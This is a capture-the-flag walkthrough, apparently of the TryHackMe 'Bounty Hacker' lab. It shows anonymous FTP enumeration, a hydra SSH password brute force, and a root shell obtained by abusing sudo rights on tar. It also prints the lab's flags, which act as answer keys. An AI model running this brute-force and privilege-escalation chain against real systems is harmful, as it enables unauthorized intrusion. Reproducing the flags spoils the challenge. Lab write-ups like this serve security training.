my ip      : 10.2.3.159
target ip : 10.10.207.178

A simple nmap scan gives us 3 ports :
```
ftp  : 21
ssh  : 22
http : 80
```

---

Try to connect to the ftp port as anonymous :
```
ftp 10.10.207.178

ftp> ls
229 Entering Extended Passive Mode (|||41812|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

---
Looking into the files :
```
cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin


cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
...
```

User : lin

---
Let's try to bruteforce the ssh service with the user list :
```
hydra -l lin -P locks.txt 10.10.207.178 ssh -t 4

Password found : RedDr4gonSynd1cat3
```

login : lin
password : RedDr4gonSynd1cat3

---
Let's connect to the ssh service with the credentials found :

user.txt : THM{CR1M3_SyNd1C4T3}

Now lets escalade privilege to get root :
```
sudo -l

[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```

We see that we can run /bin/tar with sudo without password

Let's abuse this breach with this command that will lead to a root shell :
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)

# cd /root
# cat root.txt
THM{80UN7Y_h4cK3r}

```

root.txt : THM{80UN7Y_h4cK3r}

